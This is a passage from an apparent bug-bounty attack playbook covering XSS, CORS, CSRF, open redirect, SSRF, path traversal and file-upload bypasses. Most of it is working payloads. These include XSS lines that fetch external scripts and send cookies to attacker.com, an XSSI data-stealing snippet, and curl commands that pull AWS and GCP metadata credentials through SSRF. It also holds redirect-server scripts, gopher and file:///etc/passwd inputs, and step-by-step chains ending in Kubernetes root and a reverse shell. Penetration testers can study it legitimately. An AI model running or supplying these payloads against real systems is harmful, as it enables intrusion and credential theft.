# - Any form where multiple fields are rendered together

# Also try splitting across:
# - Subject + body of a message
# - Title + description
# - Parameter name + parameter value
# - URL path + query string
```

#### 🎯 Reflected XSS Bypass on Email Parameter (Tip #61)

```html
<!-- Blocked: -->
"><script>alert('1')</script>
"><img src=x onerror=alert('XSS')>
"><a href="javascript:alert('XSS')">Click Me</a>

<!-- Bypass payloads: -->
">1')"--><Svg/OnLoad=(confirm)(1)<!--
">')"--><Script/Src=//jxss.netlify.app/10.js></Script>
">'"1<!--></Title/</Textarea/</Script/></Iframe><Details/Open/OnToggle=(confirm)(1)-->

<!-- Key techniques: -->
<!-- - Use HTML comments to break out of context -->
<!-- - Use case variation (Svg, OnLoad) -->
<!-- - Use parentheses around function names: (confirm)(1) -->
<!-- - Use external script loading -->
<!-- - Close multiple potential parent tags at once -->
```

#### Stored XSS Strategy

```bash
# High-value targets
- User profile fields (name, bio, avatar properties)
- Product descriptions, names, variant options
- Comment systems, forum posts, ticket subjects
- File names (uploaded files, shared documents)
- Email subjects (rendered in web UI)
- Calendar event titles, descriptions
- Invoice memos, payment notes
- Configuration fields (branding, settings)
- Metadata fields (embeds, attachments)
- Rich text editors (Trix, CKEditor, TinyMCE)
- SMTP bounce/error messages
- Kroki diagram lang attributes
- ActionText ContentAttachment
- Team/workspace/group names

# WYSIWYG Editor Bypasses
- HTML source mode bypasses visual sanitization
- Paste handling: data-trix-attachment with serialized JSON
- SVG use tag with data URIs
- Math+style or SVG+style combination
- Drag-and-drop + redirect bypasses X-Frame-Options
```

#### Blind XSS Strategy

```bash
# Deployment targets
- Contact forms, feedback forms, support tickets
- Admin-only interfaces, review panels
- Email campaigns (executed when admin opens)
- PDF generators (executed during server-side rendering)
- Error logging systems (ELMAH, Sentry)
- Analytics dashboards
- Device names, staff names
- Any input that reaches admin/staff view

# Payloads
<script src=https://xss.ht></script>
<img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>
<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();
a.addEventListener("load", b);a.open("GET", "//ks.xss.ht");a.send();</script>
```

### 🌐 CORS Misconfiguration (Tips #11, #28, #45)

```bash
# CORS Reality Check (Tip #11):
# Seeing: Access-Control-Allow-Origin: *
# is NOT automatically a vulnerability.
# Verify:
✓ Credentials enabled? (Access-Control-Allow-Credentials: true)
✓ Sensitive responses? (Does the endpoint return user data?)
✓ Authentication required? (Is there a session/cookie?)
✓ Trusted origins reflected? (Does it reflect arbitrary Origin?)

# Misconfigured CORS requires REAL IMPACT - not just a wildcard header.

# POC - Admin API Access (Tip #28):
# 1. Tested admin API with custom Origin header
# 2. Server reflected attacker-controlled origin
# 3. Credentials were allowed in CORS response
# 4. Retrieved admin data from victim browser

# POC - Account Data Theft (Tip #45):
# 1. Tested API endpoint with custom Origin header
# 2. Server responded with Access-Control-Allow-Origin: *
# 3. Added withCredentials request from attacker site
# 4. Browser returned authenticated API response

# Testing:
curl -H "Origin: https://evil.com" -v https://target.com/api/sensitive
# Check response for:
# Access-Control-Allow-Origin: https://evil.com  (reflected = bad)
# Access-Control-Allow-Credentials: true         (with reflection = critical)

# Dangerous patterns:
# - Origin: null → accepted (sandboxed iframes send null)
# - Origin: https://target.com.evil.com → accepted (substring match)
# - Origin: https://eviltarget.com → accepted (endsWith check)
# - Origin: https://target.com@evil.com → accepted (URL parsing)

# Learning:
# - Never use wildcard origins with credentials
# - Restrict CORS to trusted domains only (exact match)
# - Don't use substring/regex matching for origins
```

### 🌐 XSSI (Cross-Site Script Inclusion) (Tip #75)

```html
<!-- Technique: Leaking sensitive JSONP/JS data by overriding native JS constructors. -->
<script>
function Array() {
  // Override Array constructor to steal data
  var data = arguments[0];
  new Image().src = "https://attacker.com/steal?data=" + JSON.stringify(data);
}
</script>
<script src="https://victim.com/api/data?callback=Array"></script>

<!-- Also test: -->
<!-- - JSONP endpoints without callback validation -->
<!-- - JavaScript files that return user-specific data -->
<!-- - Dynamic script includes with session cookies -->
<!-- - API responses with Content-Type: text/javascript -->

<!-- Mitigation check: -->
<!-- - X-Content-Type-Options: nosniff -->
<!-- - Content-Type: application/json (not text/javascript) -->
<!-- - Anti-XSSI prefix: )]}' or while(1); -->
```

### CSRF (Cross-Site Request Forgery)

```bash
# Bypass Techniques
- Missing Origin header accepted (default-allow) — TikTok Webcast
- Content-Type switching: JSON → form-urlencoded
- text/plain avoids CORS preflight
- SameSite=Lax bypass via same-parent-domain subdomain
- Token not bound to session / interchangeable cookie+body
- Static/undefined token (X-CSRF-TOKEN: Undefined)
- GET state-changing endpoints
- Path traversal to bypass CSRF route checks
- CRLF to set CSRF cookie
- Subdomain XSS → same-site CSRF
- Login CSRF → chained Self-XSS
- OAuth state fixation

# Always Test
Every state-changing action: follow/unfollow, upload, delete, invite,
payout change, 2FA add/remove, phone change, email change,
subscription cancel, team member remove, webhook edit, theme publish

# Testing Checklist
- Remove CSRF token → should fail
- Use token from different user → should fail
- Use token from different session → should fail
- Change request method → should fail
- Remove Content-Type header → should fail
- Send from different origin → should fail
```

### Open Redirect

```bash
# Bypass Payloads
//evil.com/                              (protocol-relative)
/%2f%2f%2fevil.com%2f%3fwww.site.com     (encoded slashes)
//evil.com/..;/css                       (path traversal)
https://site.com//evil.com/              (double slash)
/@evil.com                               (@ prefix)
https://legit.com@evil.com
https://evil.com#@legit.com              (fragment)
https://evil.com%23@legit.com
javascript:alert(1)                      (scheme bypass → XSS)
data:text/html,...
Non-Latin IDN: नमस्ते.भारत
Unicode Ideographic Full Stop 。          (replaces .)
Base64-encoded redirect_url
Null byte: http://evil.org/%00

# Open Redirect Bypass Payloads (Tip #35):
//evil.com
https://trusted.com.evil.com
/%2f%2fhttp://2fevil.com
javascript:alert(1)
https:http://evil.com
//evil.com

# Chaining Value
- OAuth code theft (redirect_uri → attacker page → analytics exfil)
- Phishing post-login
- Token leakage via form POST (authenticity_token in body)
- SSRF pivot
- Cache poisoning DoS
- Tab-napping (window.opener.location.replace)
```

### Clickjacking

```bash
# Testing
- Check for X-Frame-Options and CSP frame-ancestors
- ALLOW-FROM is not supported by Chrome → vulnerable
- Missing both headers = clickjacking possible
- Combine with CSRF for 0-click exploits
- Combine with Chrome remote debugging for RCE (Burp)

# Advanced
- Overlay transparent iframe on sensitive buttons
- UI redressing with CSS
- Drag-and-drop attack vectors (TinyMCE)
- Tapjacking on Android OAuth consent (filterTouchesWhenObscured)
```

---

## 7. SERVER-SIDE VULNERABILITIES

### 🔴 SERVER-SIDE REQUEST FORGERY (SSRF) — THE COMPLETE PLAYBOOK

#### The Mental Model

SSRF is the only bug class where the server fetches YOUR URL. Every other bug makes the server respond to your input. SSRF makes it reach out. And when the server reaches out, it carries its internal credentials, its internal network access, and its internal trust into that request.

You are not attacking the server. You are using the server as a tunnel to attack everything it can reach. The server is inside the trust boundary. You are outside. When the server fetches your URL, it carries:

- Its internal credentials (cloud IAM tokens, service account keys)
- Its internal network access (localhost, private subnets, Kubernetes API)
- Its internal trust (IP-based allowlists, mTLS certificates)

The same SSRF that gets rated "medium" can become a $25,000 critical. Two different RCE chains exist in the disclosed dataset. The difference is always what you do after the server fetches your URL.

#### The Attack Surface Map

```bash
# Obvious vectors
- Webhook URLs
- URL parameters (?url=, ?src=, ?fetch=, ?target=)
- Image/avatar/logo upload via URL
- Link preview / unfurler APIs
- PDF generation from URL
- Screenshot rendering services
- OAuth callback URLs

# Hidden vectors (harder to find, harder to filter)
- Video transcoding (FFmpeg HLS/concat directives)
- Document import ("import from URL")
- File thumbnail generation (LibreOffice, ImageMagick)
- Project export/import (CarrierWave remote_attachment_url)
- Error reporting (Sentry source code scraping)
- Calendar subscription URLs
- GraphQL parameters accepting URL-like strings
- Meme creation features
- SVG xlink:href / fill="url(...)"
- TURN relay endpoints
- Kubernetes storage provisioner resturl
- CI/CD artifact download URLs
- Email template rendering (remote images)
- Chat embed/linkification (Matrix preview_url)
- Notification server configuration
```

#### IP Representation Bypasses (Filter Evasion)

```bash
# Standard representations
http://127.0.0.1 / http://0.0.0.0 / http://localhost
http://[::1]                              IPv6 loopback

# IPv4-mapped IPv6
http://[::ffff:a9fe:a9fe]                 → 169.254.169.254
http://[::ffff:127.0.0.1]                 → 127.0.0.1
http://[0:0:0:0:0:ffff:127.0.0.1]        → 127.0.0.1

# Unicode / Fullwidth
http://⑯⑨。②⑤④。⑯⑨｡②⑤④                  → 169.254.169.254
http://①②⑦。⓪。⓪。①                      → 127.0.0.1

# Hex / Octal / Decimal
http://0x7f000001                         → 127.0.0.1
http://0x00007f000001                     → 127.0.0.1 (truncation)
http://0177.0.0.1                         → 127.0.0.1 (octal)
http://2130706433                         → 127.0.0.1 (decimal)
http://0251.0376.0251.0376                → 169.254.169.254 (octal)
http://2852039166                         → 169.254.169.254 (decimal)

# NAT64 prefix (bypasses IPv4-only blocklists)
http://[64:ff9b:1::a9fe:a9fe]            → 169.254.169.254

# Hostname tricks
http://metadata.google.internal           GCP metadata (no IP filter)
http://100.100.100.200                    Alibaba metadata
http://169.254.169.254/latest/meta-data/  AWS/EC2

# Trailing dot (Stripe Smokescreen bypass)
http://example.com.                       (trailing dot)
http://[[]]                               (double brackets)

# URL parsing discrepancies
http://example.com#@evil.com              (# truncation)
http://example.com%23@evil.com
http://evil.com%00.example.com            (null byte)

# Protocol wrappers
gopher:// ftp:// file:// dict://
```

#### 🔓 SSRF Bypass via URL Parsing Inconsistencies (Tip #67)

```bash
# Technique: SSRF filter bypass using URL parsing inconsistencies.
# Payloads:
http://0x7f000001/              # Hex IP
http://0177.0.0.1/              # Octal IP
http://evil%2egood.com          # Encoded dot
http://user@internal-host       # @ in URLs (credentials before @)
http://internal-host#@evil.com  # Fragment confusion
http://internal-host%00.evil.com # Null byte

# Philosophy: Understand how the backend parser resolves URLs vs. how the
# WAF/firewall parses them (Parser Differential).
# The key insight: The validator and the fetcher are often DIFFERENT libraries.
# If they parse URLs differently, you can pass validation but fetch internal.
```

#### 🔓 SSRF to RCE via Internal Services (Tip #66)

```bash
# Technique: SSRF via chainable parameters to hit internal corporate network.
# Payloads:
url=http://internal-server:port/
# Combined with internal deserialization gadgets

# Philosophy: Internal networks often lack auth; SSRF is the gateway to pivot
# and exploit trusted environments.

# Common internal targets reachable via SSRF:
# - http://internal-jenkins:8080/script (Groovy console → RCE)
# - http://internal-redis:6379 (SET/GET → job injection)
# - http://internal-elasticsearch:9200 (Painless script → RCE)
# - http://internal-docker:2375 (container management)
# - http://internal-kubernetes:10250 (kubectl exec)
# - http://internal-grafana:3000 (admin panel)
```

#### 🔓 SSRF Payload Collection (Tip #35)

```bash
# Basic SSRF payloads:
http://127.0.0.1:80
http://169.254.169.254/latest/meta-data/
http://localhost/admin
file:///etc/passwd
gopher://127.0.0.1:25/xHELO
dict://127.0.0.1:11211/stat
http://0x7f000001
http://2130706433
```

#### Pattern 1: Cloud Metadata Extraction (The $25K Escalation)

This is the escalation that turns a medium SSRF into a critical. Every major cloud provider exposes a metadata endpoint accessible from within the instance. If your SSRF can reach that endpoint, you can extract service account tokens, SSH keys, and Kubernetes credentials.

**Shopify #341876 (577 upvotes, $25,000)** — Screenshot rendering → GCP metadata → Kubernetes root:

```html
<!-- Injected into Liquid template of attacker's own store -->
<script>
window.location="http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token";
</script>
```

Key insight: `/v1beta1` does NOT require the `Metadata-Flavor: Google` header, while `/v1` does. Most filters miss this.

Escalation: Append `?alt=json` → leak SSH keys, project names → pull `kube-env` → extract Kubelet certs + private keys → `kubectl exec` → root on every container in the cluster.

**HackerOne #2262382 (515 upvotes, $25,000)** — PDF generation → AWS metadata:

```html
<!-- Injected into analytics report template name -->
<iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/"></iframe>
```

The PDF renderer followed the iframe URL and leaked temporary AWS credentials in the generated PDF.

**Other metadata extraction reports:**
- Vimeo #549882 (275 upvotes, critical): Upload function → GCP metadata → SSH keys
- Omise #508459 (212 upvotes, high): Webhook delivery → 303 redirect → AWS metadata → `aws-opsworks-ec2-role` private keys
- Evernote #1189367 (259 upvotes, critical): URL proxy with base64-encoded URLs → AWS metadata + local files

**How to test:**

```bash
# AWS
curl 'http://target/fetch?url=http://169.254.169.254/latest/meta-data/'
curl 'http://target/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'
curl 'http://target/fetch?url=http://169.254.169.254/latest/user-data'

# GCP (use v1beta1 — no header required!)
curl 'http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token'
curl 'http://target/fetch?url=http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json'

# Alibaba
curl 'http://target/fetch?url=http://100.100.100.200/latest/meta-data/'

# Azure
curl 'http://target/fetch?url=http://169.254.169.254/metadata/instance?api-version=2017-08-01'
```

#### Pattern 2: DNS Rebinding & Filter Bypass (ToCToU)

Most platforms implement SSRF protections: IP blocklists, URL validators, DNS resolution checks. These fail in predictable ways. The most common failure is DNS rebinding — the server resolves the domain twice (once to validate, once to fetch), and the attacker controls which IP each resolution returns.

**GitLab #541169 (70 upvotes)** — Classic ToCToU:
- GitLab::UrlBlocker resolves domain → checks IP against blocklist → passes URL to HTTParty
- HTTParty resolves domain AGAIN → attacker's DNS alternates between valid IP and 127.0.0.1 (TTL=0)
- Send many parallel webhook requests → one hits the race

**GitLab #632101 (347 upvotes, CVE-2019-5464)** — DNS failure bypass:
- When DNS resolution FAILS, validation returns TRUE without checking IP
- Use CNAME chains to force resolution failure on validation step
- Second resolution points at 169.254.169.254

**Snapchat #530974 (417 upvotes, nahamsec)** — DNS rebinding against headless browser:
1. Host HTML page on attacker domain
2. Media import endpoint fetches it (renders in headless browser)
3. Switch DNS to point at 169.254.169.254
4. JavaScript in page sets X-Google-Metadata-Request header
5. Exfiltrate SSH keys and service accounts

**PortSwigger #3176157 (140 upvotes, $2,000)** — DNS rebinding against localhost MCP server:
- MCP Server on 127.0.0.1:9876 lacks CORS validation
- DNS rebinding domain resolves to attacker IP then 127.0.0.1
- JS connects to MCP server → send_http1_request → arbitrary internal requests

**URL parsing inconsistencies (Stripe Smokescreen bypasses):**

```bash
http://example.com.          (trailing dot) — bypasses blocklist
http://[[]]                  (double brackets) — bypasses same filter
http://[64:ff9b:1::a9fe:a9fe]  (NAT64) — bypasses IPv4-only blocklists
```

**How to test:**

```bash
# DNS rebinding setup
# 1. Register domain (e.g., rebind.attacker.com)
# 2. Configure DNS to alternate: your IP ↔ 127.0.0.1 (TTL=0)
# 3. Send many parallel requests to target endpoint
# 4. One will hit the race condition

# Tools
# - rbndr.us (free DNS rebinding service)
# - singularity (automated DNS rebinding)
# - Custom: Python DNS server with alternating responses

# URL parsing fuzzing
http://target.com.           # trailing dot
http://[[]]                  # double brackets
http://[::ffff:127.0.0.1]   # IPv6-mapped
http://0x7f000001            # hex
http://2130706433            # decimal
http://0177.0.0.1            # octal
http://[64:ff9b:1::7f00:1]  # NAT64
```

#### Pattern 3: File Processing as the Attack Surface

SSRF does not always look like a URL parameter. In 8 of 23 analyzed reports, the SSRF hid inside a feature that processes files.

**TikTok #1062888 (156 upvotes, $2,727)** — FFmpeg HLS injection via video upload:

```
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://attacker.com/callback
#EXT-X-ENDLIST
```

Upload AVI file with injected HLS directives → FFmpeg parses → makes HTTP request to attacker. Escalate to local file read via `concat` and `subfile` techniques → read `/etc/passwd` line by line.

**Slack #671935 (107 upvotes, $4,000)** — LibreOffice thumbnail generation:
- Crafted Office file triggers CVE-2019-17400 (LibreOffice URL handling)
- → Server makes outbound request → leaks AWS credentials for processing container

**GitLab #826361 (356 upvotes, $10,000)** — CarrierWave remote_attachment_url in project import:

```json
{
  "remote_attachment_url": "http://attacker.com/ssrf",
  "remote_attachment_request_header": "Metadata-Flavor: Google"
}
```

`AttributeCleaner` stripped most dangerous attributes but missed `remote_attachment_url` AND `remote_attachment_request_header` (enabling GCP metadata header injection).

**Rockstar Games #288353 (51 upvotes, $1,500)** — ImageMagick SVG UNC path:

```xml
<image xlink:href="\\attacker\share\file.svg" />
```

Server sends NTLMv2 hash to attacker → offline password cracking or SMB relay.

**How to test:**

```bash
# Identify every feature that processes user-supplied files or URLs:
□ Video upload/transcoding (test HLS directives in AVI/MP4)
□ Image import/processing (test SVG xlink:href, ImageMagick)
□ Document preview (test LibreOffice CVEs, embedded URLs)
□ PDF generation (test iframe/script injection)
□ Project import/export (test remote_attachment_url, URL attributes)
□ Screenshot rendering (test JavaScript redirects)
□ File thumbnails (test Office document embedded URLs)
□ Audio processing (test playlist URLs)
# For each: Can you supply a URL that the server will fetch?
# The processing pipeline IS the attack surface, not just the URL parameter.
```

#### Pattern 4: Redirect Chain Exploitation

Even when a platform validates the initial URL and blocks internal addresses, the server often follows redirects without re-validating the destination.

**GitLab #878779 (228 upvotes, critical, rhynorater)** — Gravatar → WordPress CDN → arbitrary host:

```
https://secure.gravatar.com/avatar/anything?d=/google.com/1.bp.blogspot.com/
→ http://i0.wp.com/google.com/1.bp.blogspot.com/
→ https://google.com/1.bp.blogspot.com
```

Chain: Gravatar (trusted) → i0.wp.com (open redirect to *.bp.blogspot.com) → arbitrary host. Filter validates initial request to secure.gravatar.com ✓. Redirect chain bypasses entirely ✓. Full read, unauthenticated SSRF from GitLab's internal Grafana.

**Omise #508459 (212 upvotes, high)** — 303 redirect bypass:

```php
<?php
// Attacker's server
header('Location: http://169.254.169.254/latest/meta-data/iam/security-credentials/aws-opsworks-ec2-role', TRUE, 303);
?>
```

Webhook validated initial URL (attacker's server, allowed). 303 redirect followed WITHOUT re-validation. Key insight: Some filters block 301/302 but follow 303 See Other.

**How to test:**

```bash
# Host redirect script on your server
# Test ALL redirect status codes: 301, 302, 303, 307, 308

# PHP redirect script:
<?php header('Location: http://169.254.169.254/latest/meta-data/', TRUE, 303); ?>

# Python redirect script:
from http.server import HTTPServer, BaseHTTPRequestHandler
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(303)
        self.send_header('Location', 'http://169.254.169.254/latest/meta-data/')
        self.end_headers()
HTTPServer(('', 80), H).serve_forever()

# Also look for legitimate redirect chains through trusted services:
# - Gravatar (d= parameter)
# - WordPress CDN (i0.wp.com)
# - Google Drive (export links)
# - Bit.ly / t.co (URL shorteners)
# - OAuth providers (redirect_uri chains)
```

#### Pattern 5: Blind SSRF via Integrations & Misconfigurations

Not every SSRF returns the response. Many are blind: the server fetches your URL, but you never see what it gets back.

**Reddit #1960765 (339 upvotes, $6,000)** — Matrix chat preview_url:

```
/_matrix/media/r0/preview_url/?url=http://INTERNAL_IP
→ No URL filtering
→ og:title metadata in preview response leaks service names and IPs
→ Partially blind, but enough to map internal network
```

**EXNESS #1864188 (258 upvotes, $3,000)** — GraphQL allTicks query:

```graphql
query { allTicks(source: "http://BURP_COLLABORATOR_URL") { ... } }
→ Server makes GET request to attacker's callback
→ DNS + HTTP callbacks confirm blind SSRF
```

**GitLab #398799 (237 upvotes, $4,000, jobert)** — OAuth Jira controller Host header:

```bash
curl -X POST -H 'Host: 162.243.147.21:81' 'https://gitlab.com/-/jira/login/oauth/access_token'
→ oauth_token_url constructed from Host header
→ GitLab sends POST to attacker IP
→ No authentication required
```

**HackerOne #374737 (141 upvotes, $3,500)** — Sentry source code scraping:
- Sentry "source code scraping" feature follows URLs in error report stack traces
- Send crafted error report with filename parameter → attacker server
- Callback confirmed from errors.hackerone.net
- Sentry misconfiguration is a recurring vector: similar reports for Nord Security, Cloudflare, Mail.ru

**inDrive #2300358 (136 upvotes, $2,000)** — Simplest form:

```
GET /api/file-storage?url=http://attacker.com
→ Full read SSRF from a single GET request
→ Server fetches any URL, returns content in response body
```

**How to test:**

```bash
# Find every endpoint that makes outbound requests:
□ Link previews (Matrix, Slack, Discord-style unfurlers)
□ Webhook delivery (test with callback server)
□ Error reporting (Sentry DSNs, source code scraping)
□ Integration callbacks (OAuth, Jira, Slack)
□ GraphQL parameters accepting URL-like strings
□ OAuth callback URLs
□ File thumbnails / preview generators
□ Notification server configuration

# Use callback server (Burp Collaborator, interactsh) to confirm outbound request.
# Even without response, confirmed outbound request = SSRF exists.

# For Sentry-based SSRF:
# - Check if "source code scraping" is enabled
# - Send crafted error reports with internal URLs in filename parameter
# - POST to /api/<project_id>/store/ with stack trace containing attacker URL
```

#### The SSRF Escalation Ladder

```
RUNG 1: BLIND CALLBACK ($0 - $500)
   Server fetches your URL. You confirm via callback server. No data returned.

RUNG 2: INTERNAL ENUMERATION ($500 - $2,000)
   Server fetches internal URL. You extract partial data.
   - og:title metadata leaks service names (Reddit Matrix)
   - Error messages differ for open vs closed ports
   - Response timing reveals service presence

RUNG 3: CLOUD METADATA ($5,000 - $25,000)
   Server fetches 169.254.169.254 (AWS) or metadata.google.internal (GCP).
   You get: service account tokens, SSH keys, instance metadata.

RUNG 4: INTERNAL API ABUSE ($10,000 - $25,000)
   From metadata, access internal APIs that trust the server.
   Chain A — Kubernetes:
     GCP metadata → kube-env → Kubelet certs + private keys
     → kubectl → service account token → exec → ROOT
   Chain B — Jolokia/JMX:
     SSRF → localhost:6725 (Jolokia) → JMX DiagnosticCommand MBean
     → jvmtiAgentLoad → load arbitrary JVM agent → RCE

RUNG 5: FULL RCE ($15,000 - $25,000+)
   Chain A (Shopify #341876):
     SSRF → metadata → kube-env → Kubelet certs → kubectl
     → service account token → exec /bin/bash → uid=0(root)
     Root on EVERY container in the cluster. $25,000.
   Chain B (Aiven #1547877):
     SSRF → Kafka Connect HTTP sink → localhost:6725 (Jolokia)
     → jvmtiAgentLoad → embed JAR in SQLite BLOB → upload via JDBC
     → execute as JVM agent → reverse shell. $5,000.
```

#### The Two RCE Chains in Detail

**Chain A: Shopify Kubernetes ($25,000)**

```bash
1. SSRF via screenshot rendering (Liquid template → JS redirect)
2. Fetch: http://metadata.google.internal/computeMetadata/v1beta1/.../token?alt=json
3. Extract: SSH keys, project names, instance names
4. Fetch: kube-env attribute from metadata
5. Extract: Kubelet certificate, Kubelet private key, cluster CA cert
6. kubectl --certificate-authority=ca.crt --client-certificate=kubelet.crt --client-key=kubelet.key get pods --all-namespaces
7. kubectl describe pod <pod> → find service account token
8. kubectl exec -it <pod> -- /bin/bash
9. uid=0(root) gid=0(root) groups=0(root)
```

**Chain B: Aiven Kafka Connect → Jolokia ($5,000)**

```bash
1. SSRF via Kafka Connect HTTP sink connector
2. Target: http://localhost:6725 (Jolokia JMX HTTP bridge)
3. Access: JMX DiagnosticCommand MBean
4. Invoke: jvmtiAgentLoad operation
5. Embed: reverse shell JAR inside SQLite database as BLOB
6. Upload: database file via JDBC driver file upload capability
7. Execute: JAR as JVM agent via jvmtiAgentLoad
8. Result: reverse shell on Kafka Connect server
```

#### High-Value SSRF Targets (Prioritized)

```bash
# Tier 1 — Immediate cloud metadata test
- Image/avatar/logo fetch by URL
- Webhooks (test 301/302/303/307/308 redirects)
- PDF generators (iframe/script injection)
- Screenshot rendering services (JS redirects)
- Link previews / unfurlers (Matrix preview_url)

# Tier 2 — File processing pipelines
- Video upload/transcoding (FFmpeg HLS)
- SVG processing (ImageMagick, librsvg)
- Document import (CarrierWave remote_attachment_url)
- Office file thumbnails (LibreOffice)
- Project export/import (URL attributes in JSON)

# Tier 3 — Integration & configuration
- OAuth/Jira callbacks (Host header injection)
- Sentry error reporting (source code scraping)
- Calendar subscriptions
- Notification server configuration
- TURN relays
- Kubernetes storage provisioner resturl
- CI/CD artifact download URLs
```

#### The 5-Question Testing Framework (60 seconds each)

```
Q1: Does this endpoint accept a URL that the server will fetch?
Q2: Can the server reach internal addresses?
Q3: Is there a filter? Can you bypass it?
Q4: Is the response returned (full read) or blind?
Q5: Can you escalate to cloud metadata or an internal API?
```

#### SSRF Payload Quick Reference

```bash
# Basic detection
?url=http://BURP_COLLABORATOR_URL
?url=http://127.0.0.1
?url=http://169.254.169.254/latest/meta-data/
?url=http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token

# AWS metadata full chain
?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
?url=http://169.254.169.254/latest/user-data
?url=http://169.254.169.254/latest/dynamic/instance-identity/document

# GCP metadata (v1beta1 = no header needed)
?url=http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token?alt=json
?url=http://metadata.google.internal/computeMetadata/v1beta1/instance/attributes/kube-env

# Bypass representations
?url=http://[::ffff:a9fe:a9fe]
?url=http://⑯⑨。②⑤④。⑯⑨｡②⑤④
?url=http://0x00007f000001
?url=http://[64:ff9b:1::a9fe:a9fe]

# Redirect-based (host on your server)
?url=http://your-server.com/redirect303.php  → 303 → http://169.254.169.254/

# Protocol smuggling
?url=gopher://127.0.0.1:6379/_SET%20key%20value
?url=file:///etc/passwd
?url=dict://127.0.0.1:6379/info

# SVG-based
<image xlink:href="http://169.254.169.254/latest/meta-data/" />
<path fill="url(http://attacker.com#test)" />

# FFmpeg HLS (upload as video)
#EXTM3U
#EXT-X-MEDIA-SEQUENCE:0
#EXTINF:10.0,
http://attacker.com/callback
#EXT-X-ENDLIST

# DNS rebinding
# Configure domain to alternate: your-IP ↔ 127.0.0.1 (TTL=0)
# Send 50+ parallel requests → one hits the race
```

#### 🔓 SSRF → Internal Admin Panel Access (Tip #34)

```bash
# POC:
# 1. Found feature fetching external URLs
# 2. Supplied internal admin panel address
# 3. Server fetched internal response
# 4. Accessed restricted admin interface

# Common internal admin panels to target:
http://127.0.0.1:8080/admin
http://127.0.0.1:9000/          (SonarQube)
http://127.0.0.1:15672/         (RabbitMQ)
http://127.0.0.1:5601/          (Kibana)
http://127.0.0.1:3000/          (Grafana)
http://127.0.0.1:8888/          (Jupyter)
http://10.0.0.1/admin
http://192.168.1.1/
http://internal-jenkins:8080/

# Learning:
# - Block requests to internal IPs (RFC 1918, link-local, loopback)
# - Restrict server-side URL fetching to allowlisted domains
# - Use network segmentation for internal services
```

#### 🔴 SSRF IN APIs (from API Pentesting Blog)

```bash
# Two types of API SSRF:
# In-Band SSRF: server responds with fetched content
# Blind SSRF: server makes request but doesn't return content

# In-Band SSRF Example:
# Intercepted:
POST api/v1/store/products
{"inventory":"http://store.com/api/v3/inventory/item/12345"}
# Attack:
POST api/v1/store/products
{"inventory":"http://localhost/secrets"}
# Response:
{"secret_token":"crapi-admin"}

# Blind SSRF Example:
# Attack:
POST api/v1/store/products
{"inventory":"https://webhook.site/YOUR-UUID"}
# Check webhook.site for incoming requests (not the API response)

# Free callback services for Blind SSRF:
http://webhook.site
http://pingb.in/
https://requestbin.com/
https://canarytokens.org/

# Where to look for SSRF in APIs:
□ Full URLs in POST body or parameters
□ URL paths (partial URLs) in POST body or parameters
□ Headers with URLs (Referer, X-Forwarded-For)
□ Any user input that could cause server to retrieve resources

# Dangerous protocol schemas for SSRF:
dict://
file://
ftp://
gopher://
ldap://
smtp://
telnet://
tftp://

# MORE: https://cheatsheetseries.owasp.org/assets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet_SSRF_Bible.pdf
# MORE: https://l1nuxkid.gitbook.io (All About SSRF)

# OWASP API7 (SSRF) — Also known as Cross-Site Port Attack (XPSA)
# Occurs when API uses user-controlled input to fetch resources without validation
# Lets attacker bypass firewalls/VPNs to reach internal destinations
```

### Path Traversal / Local File Inclusion

```bash
# Common Patterns
../../../../../../etc/passwd
..%2f..%2f..%2f
%2e%2e%2f
....//....//
..\\..\\malicious.dll                  (Windows)
file:///data/user/0/com.pkg/cache/../shared_prefs   (Android)
~2/foo                                 (SFTP tilde)
/.?                                    (S3 signed URL)
filename with %0d%0a.js                (Oracle EBS CRLF bypass)
Tempfile.open(['../../home/x/', '.red'])  (Ruby)
Null byte: /home/vagrant\0xxx          (Ruby Dir methods)

# LFI Payloads (Tip #35):
../../../../etc/passwd
....//....//....//etc/passwd
/etc/passwd%00
php://filter/convert.base64-encode/resource=index.php
php://input
/proc/self/environ
../../../../windows/win.ini

# Advanced Techniques
- Symlink attacks: ln -s /etc/passwd ./target
- Directory junctions (Windows): mklink /J target C:\Windows\System32
- Path normalization bypass: /path/..;/admin (IIS)
- Double encoding: %252e%252e%252f
- UTF-8 overlong encoding: %c0%ae%c0%ae%c0%af
- ZIP slip: malicious entries with ../ in filename

# Node.js Specific
- Monkey-patch Buffer.prototype.utf8Write to bypass path.resolve()
- Uint8Array bypasses string/Buffer checks
- path.resolve override: path.resolve = (s) => s
- fs.fchown/fchmod bypass permission model via FD
```

#### 🔓 Base64 Encoding Bypass for LFI (Tip #20)

```bash
# If direct LFI is blocked:
url/?f=etc/passwd          → 403
# Encode the path as base64:
url/?f=L2V0Yy9wYXNzd2Q=   → 200

# This trick works because:
# - WAFs often check for "../" and "/etc/passwd" in raw form
# - But don't decode base64 before checking
# - The application decodes it server-side

# NOTE: You can use this trick in:
# - SQL injection (encode the payload)
# - SSTI (encode template syntax)
# - XSS (encode script tags)
# - LFI (encode file paths)
# - Command injection (encode commands)

# Python helper:
import base64
payload = "/etc/passwd"
encoded = base64.b64encode(payload.encode()).decode()
print(encoded)  # L2V0Yy9wYXNzd2Q=
```

### File Upload Vulnerabilities

```bash
# Bypass Techniques
- Extension bypass: shell.php.jpg, shell.php%00.jpg
- MIME type spoofing: Content-Type: image/jpeg for .class/.exe
- Magic bytes: GIF89a followed by PHP code
- SVG with embedded JavaScript/XXE/SSRF
- SVG with DOCTYPE entity to disable whitelist
- Polyglot files: valid image + malicious code
- ZIP with symlink: ln -s /etc/passwd file.txt
- Client-side bypass: "Click to browse" instead of drag-and-drop
- PostScript/EPS renamed .gif → Ghostscript RCE
- Crafted images: GD2 integer overflow, pixel flood 64K×64K
